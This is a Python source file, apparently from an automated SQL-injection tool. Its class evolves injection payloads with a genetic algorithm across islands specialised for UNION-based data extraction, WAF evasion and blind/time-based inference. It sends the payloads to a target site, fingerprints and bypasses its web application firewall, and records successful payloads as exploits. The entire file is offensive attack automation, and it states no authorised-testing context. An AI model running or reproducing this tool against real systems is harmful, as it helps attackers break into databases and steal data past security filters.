import random
import time
import json
from core.mutator_ast import ASTMutator
from core.payload_genome import PayloadGenome
from core.predictive_blocker import PredictiveBlocker
from core.waf_fingerprinter import WAFFingerprinter
from core.error_refiner import SQLErrorRefiner
from utils.success_validator import SuccessValidator

class IslandManager:
    def __init__(self, client, base_payloads, exp_manager, population_size=12, num_islands=3, context="GENERIC", disable_strings=True, baseline=None):
        self.client = client
        self.baseline = baseline
        self.exp_manager = exp_manager
        self.base_seeds = base_payloads
        self.num_islands = num_islands
        self.island_pop_size = population_size // num_islands
        self.validator = SuccessValidator()
        self.best_score_history = []
        self.hall_of_fame = [] 
        self.discovered_niches = set()
        self.stagnation_counter = 0
        self.context = context
        self.disable_strings = disable_strings
        self.blocker = PredictiveBlocker()
        self.fingerprinter = WAFFingerprinter()
        self.error_refiner = SQLErrorRefiner()
        self.session_tested = set() # Avoid repeating in same session
        self.current_gen = 0
        
        # Initialize Islands with their own mutators and populations
        self.islands = []
        
        # Try to load previous state
        saved_state = self.exp_manager.load_session_state(client.base_url)
        if saved_state:
            try:
                state = json.loads(saved_state)
                self.current_gen = state.get('gen_num', 0)
                print(f"[*] Resuming from previous session (Generation {self.current_gen})", flush=True)
                for i_data in state['islands']:
                    is_quoteless = (context == "QUOTELESS_STRING")
                    actual_context = "SINGLE_QUOTE" if is_quoteless else context
                    mutator = ASTMutator(context=actual_context, quoteless=is_quoteless, disable_strings=self.disable_strings)
                    # Merge weights to support new strategies in old sessions
                    loaded_weights = i_data['weights']
                    for k, v in loaded_weights.items():
                        if k in mutator.strategy_weights:
                            mutator.strategy_weights[k] = v
                    
                    mutator.keyword_reputation = i_data['reputation']
                    
                    # Population is now a list of dicts (genomes)
                    pop = []
                    for p in i_data['population']:
                        if isinstance(p, dict) and "core" in p:
                            pop.append(PayloadGenome.from_dict(p))
                        elif isinstance(p, str):
                            pop.append(PayloadGenome.from_string(p))
                            
                    self.islands.append({
                        "id": i_data['id'],
                        "mutator": mutator,
                        "population": pop,
                        "stagnation": i_data.get('stagnation', 0),
                        "best_score": i_data.get('best_score', 0)
                    })
                return # Skip default initialization
            except Exception as e:
                print(f"[!] Failed to load state: {e}. Starting fresh.", flush=True)

        for i in range(num_islands):
            is_quoteless = (context == "QUOTELESS_STRING")
            # If it's quoteless, we still treat the inner context as essentially string-breaking, but with backslashes
            actual_context = "SINGLE_QUOTE" if is_quoteless else context
            
            # Setting disable_strings dynamically based on target security
            mutator = ASTMutator(context=actual_context, quoteless=is_quoteless, disable_strings=self.disable_strings)
            
            # 1. Context-Aware Initialization
            if context == "SINGLE_QUOTE" or context == "QUOTELESS_STRING":
                mutator.strategy_weights["context_aware"] *= 3.0
                print(f"[*] Island {i}: Optimizing for String contexts.", flush=True)
            elif context == "DOUBLE_QUOTE":
                mutator.strategy_weights["context_aware"] *= 3.0
                print(f"[*] Island {i}: Optimizing for DOUBLE_QUOTE context.", flush=True)
            elif context == "NUMERIC":
                mutator.strategy_weights["logical_alts"] *= 3.0
                print(f"[*] Island {i}: Optimizing for NUMERIC context.", flush=True)

            # Specialization: Each island has a different initial bias
            if i == 0: # Structural Island (Expert in Extraction)
                mutator.strategy_weights["logical_alts"] *= 2.0
                mutator.strategy_weights["union_balance"] *= 5.0
                mutator.strategy_weights["column_discovery"] *= 3.0
                mutator.strategy_weights["upgrade_to_exfil"] *= 3.0
            elif i == 1: # Bypass Island (Expert in WAF evasion)
                mutator.strategy_weights["inline_comments"] *= 2.0
                mutator.strategy_weights["junk_fill"] *= 2.0
                mutator.strategy_weights["micro_fragmentation"] *= 2.0
            else: # Inference Island (Expert in Blind/Time attacks)
                mutator.strategy_weights["blind_inference"] *= 5.0
                mutator.strategy_weights["context_aware"] *= 2.0
                mutator.strategy_weights["dynamic_structural"] *= 2.0

            # Initialize population for this island
            golden_seeds = self.exp_manager.get_golden_payloads(limit=10)
            combined_seeds = golden_seeds + base_payloads
            pop_strings = random.sample(combined_seeds, min(len(combined_seeds), self.island_pop_size))
            
            # Convert strings to structured Genomes
            pop = [PayloadGenome.from_string(s) for s in pop_strings]
            
            self.islands.append({
                "id": i,
                "population": pop,
                "mutator": mutator,
                "stagnation": 0,
                "best_score": 0
            })

        print(f"[*] Archipelago Initialized: {num_islands} Islands established.", flush=True)

    def _calculate_similarity(self, p1, p2):
        """Simple Jaccard similarity based on characters to detect structural bias."""
        s1, s2 = set(p1), set(p2)
        intersection = len(s1.intersection(s2))
        union = len(s1.union(s2))
        return intersection / union if union > 0 else 0

    def evolve_generation(self, gen_num):
        global_max_score = 0
        
        # 0. Poll for AI Hints from SQLite
        hints = self.exp_manager.get_latest_hint()
        if hints:
            print(f"[*] AI HINT RECEIVED: {hints.get('suggestion', 'N/A')}", flush=True)
            for island in self.islands:
                island["mutator"].apply_hint(hints)

        # 1. Evolve each island independently
        for island in self.islands:
            # Dynamic Epsilon based on stagnation to force exploration
            mutator = island["mutator"]
            if island["stagnation"] > 3:
                mutator.epsilon = min(0.1 + (island["stagnation"] * 0.1), 0.7)
            else:
                mutator.epsilon = 0.2
                
            island_results = self._evolve_island(island, gen_num)
            if island_results["max_score"] > global_max_score:
                global_max_score = island_results["max_score"]
            
            # Track island-specific stagnation
            if island_results["max_score"] <= island["best_score"]:
                island["stagnation"] += 1
            else:
                island["stagnation"] = 0
                island["best_score"] = island_results["max_score"]

        # 2. Migration Step: Every 5 generations, exchange genetic material
        if gen_num > 0 and gen_num % 5 == 0:
            self._migrate()

        self.best_score_history.append(global_max_score)
        
        # Global stagnation tracking
        if len(self.best_score_history) > 1:
            if self.best_score_history[-1] <= self.best_score_history[-2]:
                self.stagnation_counter += 1
                if self.stagnation_counter >= 5:
                    # Request AI Analysis
                    best_p = self.hall_of_fame[-1] if self.hall_of_fame else self.base_seeds[0]
                    print(f"[ANALYSIS_REQUIRED] Payload: {best_p} | Stagnation: {self.stagnation_counter}", flush=True)
            else:
                self.stagnation_counter = 0

        # 3. Save Session State for Persistence
        state = {
            "gen_num": gen_num,
            "islands": [
                {
                    "id": i["id"],
                    "population": [p.to_dict() for p in i["population"]],
                    "weights": i["mutator"].strategy_weights,
                    "reputation": i["mutator"].keyword_reputation,
                    "stagnation": i["stagnation"],
                    "best_score": i["best_score"]
                } for i in self.islands
            ]
        }
        self.exp_manager.save_session_state(self.client.base_url, json.dumps(state))

        return self.hall_of_fame[-1] if self.hall_of_fame else None

    def _evolve_island(self, island, gen_num):
        pop = island["population"] # List of PayloadGenome objects
        mutator = island["mutator"]
        scored_population = []
        max_score = 0
        
        # Calculate diversity
        pop_str_hashes = [p.render() for p in pop]
        unique_payloads = len(set(pop_str_hashes))
        diversity_ratio = unique_payloads / len(pop) if pop else 0

        # Dynamic Mutation Intensity for this island
        calc_intensity = 1.0 + (island["stagnation"] * 0.8)
        if diversity_ratio < 0.75:
            calc_intensity += (0.75 - diversity_ratio) * 4.0
        mutation_intensity = min(max(1, round(calc_intensity)), 6)

        if mutation_intensity >= 3:
            print(f"  [!] Island {island['id']} Chaos: Intensity {mutation_intensity} | Diversity: {diversity_ratio:.2f}", flush=True)

        for i, genome in enumerate(pop):
            payload_str = genome.render()
            if payload_str in self.hall_of_fame: continue
            
            # 0. Avoid repeating successful payloads in the same session
            if payload_str in self.session_tested:
                continue

            # 1. Predictive Blocking (The Intelligent Filter)
            # If severely stagnated, ignore predictive blocker occasionally to force exploration against real WAF
            ignore_blocker = (island["stagnation"] >= 5 and random.random() < 0.3)
            
            if not ignore_blocker:
                blocked, reason = self.blocker.should_block(payload_str)
                if blocked:
                    print(f"  [Island {island['id']}] {i+1}/{len(pop)}: [SKIPPED] Predictive rule: {reason}", flush=True)
                    score, status = 0.05, "PREDICTIVE_BLOCKED"
                    mutator.report_success(payload_str, score)
                    scored_population.append((genome, score, None))
                    continue

            response = self.client.send_request(payload_str)
            
            # 1.1 WAF Fingerprinting (First Request of the generation or if unknown)
            if i == 0:
                waf = self.fingerprinter.identify(response['headers'], response['text'])
                if waf != "GENERIC / UNKNOWN":
                    print(f"[*] WAF DETECTED: {waf}", flush=True)
                    strategy = self.fingerprinter.get_bypass_strategy(waf)
                    mutator.apply_hint({"suggestion": strategy["hint"], "weights": strategy["weights"]})

            score, status = self.validator.validate(response['text'], response['status'], payload=payload_str, baseline=self.baseline)
            
            # 1.2 Combat Genetic Drift
            if status == "WAF_BYPASSED_PARTIAL" and any("WAF_BYPASSED_PARTIAL" in n for n in self.discovered_niches):
                score *= 0.5 
                status = "LOCAL_OPTIMA_PENALIZED"

            if score <= 0.1:
                self.blocker.learn_from_block(payload_str)
            elif score >= 0.8:
                self.blocker.report_success(payload_str)

            # 3. SQL Error Refinement (Implicitly handled by AST mutations in next gen)
            error_msg = self.validator.get_sql_error(response['text'])
            
            # Similarity Penalty
            for successful_p in self.hall_of_fame:
                if self._calculate_similarity(payload_str, successful_p) > 0.8:
                    score *= 0.5
                    status = f"BIASED_{status}"
                    break

            print(f"  [Island {island['id']}] {i+1}/{len(pop)}: {payload_str[:30]}... [{score:.2f} | {status}]", flush=True)
            
            self.session_tested.add(payload_str)
            mutator.report_success(payload_str, score)
            self.exp_manager.save_attempt(payload_str, score, status)
            scored_population.append((genome, score, error_msg))
            
            if score > max_score: max_score = score
            
            # Track discoveries
            if score >= 0.3:
                self.discovered_niches.add(f"{status}_{payload_str}")
                if score >= 0.7 and payload_str not in self.hall_of_fame:
                    self.hall_of_fame.append(payload_str)
                    self.exp_manager.save_exploit(payload_str, status)

        # Next Gen for this island
        scored_population.sort(key=lambda x: x[1], reverse=True)
        elites = [p[0] for p in scored_population[:2] if p[1] > 0.2]
        survivors = [p for p in scored_population if p[1] > 0.1]
        
        island["population"] = self._generate_next_gen(elites, survivors, mutation_intensity, mutator)
        return {"max_score": max_score, "diversity": diversity_ratio}

    def _migrate(self):
        """Copies the best payload from each island to the next one in the ring."""
        print("[*] Migration Event: Exchanging genetic material between islands...", flush=True)
        for i in range(self.num_islands):
            source_island = self.islands[i]
            target_island = self.islands[(i + 1) % self.num_islands]
            
            # Get best from source (first in population is usually elite)
            best_payload = source_island["population"][0]
            
            # Inject into target island (replace a random one that isn't elite)
            replace_idx = random.randint(1, len(target_island["population"]) - 1)
            target_island["population"][replace_idx] = best_payload

    def _generate_next_gen(self, elites, survivors, intensity, mutator):
        next_gen = []
        seen_payloads = set()
        
        # Elites stay as they are
        for e in elites:
            # e is a PayloadGenome object
            payload_str = e.render()
            if payload_str not in seen_payloads:
                next_gen.append(e)
                seen_payloads.add(payload_str)

        if not survivors:
            seeds = random.sample(self.base_seeds, min(len(self.base_seeds), self.island_pop_size))
            return [PayloadGenome.from_string(s) for s in seeds]

        attempts = 0
        while len(next_gen) < self.island_pop_size and attempts < 100:
            attempts += 1
            rand_val = random.random()
            
            if rand_val < 0.15: # Diversity: Semantic Seed from Memory
                # Try to get a semantically similar payload from history for the best current survivor
                semantic_seed_str = None
                if survivors:
                    best_survivor_genome = survivors[0][0]
                    results = self.client.semantic_search(best_survivor_genome.render(), k=3)
                    if results:
                        semantic_seed_str = random.choice(results).get('content')
                
                s_str = semantic_seed_str if semantic_seed_str else random.choice(self.base_seeds)
                s_genome = PayloadGenome.from_string(s_str)
                if s_str not in seen_payloads:
                    next_gen.append(s_genome)
                    seen_payloads.add(s_str)
            elif rand_val < 0.4 and len(survivors) >= 2: # Crossover: Hybridize Bypasses
                p1, p2 = random.sample(survivors, 2)
                # p1[0] and p2[0] are PayloadGenome objects
                child1, child2 = PayloadGenome.crossover(p1[0], p2[0])
                
                # Pick one and mutate slightly
                child = random.choice([child1, child2])
                child.mutate(mutator) # Mutation uses AST
                
                child_str = child.render()
                if child_str not in seen_payloads:
                    next_gen.append(child)
                    seen_payloads.add(child_str)
            else: # Mutation
                parent_genome, score, error = random.choice(survivors)
                # Clone and mutate
                child = PayloadGenome(
                    attack_type=parent_genome.attack_type,
                    prefix=parent_genome.prefix,
                    core=parent_genome.core,
                    bypasses=list(parent_genome.bypasses),
                    terminator=parent_genome.terminator
                )
                child.mutate(mutator) # Deep mutation
                
                child_str = child.render()
                if child_str not in seen_payloads:
                    next_gen.append(child)
                    seen_payloads.add(child_str)
        
        # Emergency Fill: If uniqueness guard is too strict
        while len(next_gen) < self.island_pop_size:
             s_str = random.choice(self.base_seeds)
             s_genome = PayloadGenome.from_string(s_str)
             s_genome.mutate(mutator)
             next_gen.append(s_genome)

        return next_gen

    def _crossover(self, p1, p2):
        """Combines two payloads by splitting them at a random keyword."""
        keywords = ["UNION", "SELECT", "WHERE", "AND", "OR"]
        for kw in keywords:
            if kw in p1.upper() and kw in p2.upper():
                parts1 = p1.upper().split(kw)
                parts2 = p2.upper().split(kw)
                return parts1[0] + kw + parts2[1]
        # Fallback: simple string split
        split_idx = len(p1) // 2
        return p1[:split_idx] + p2[split_idx:]
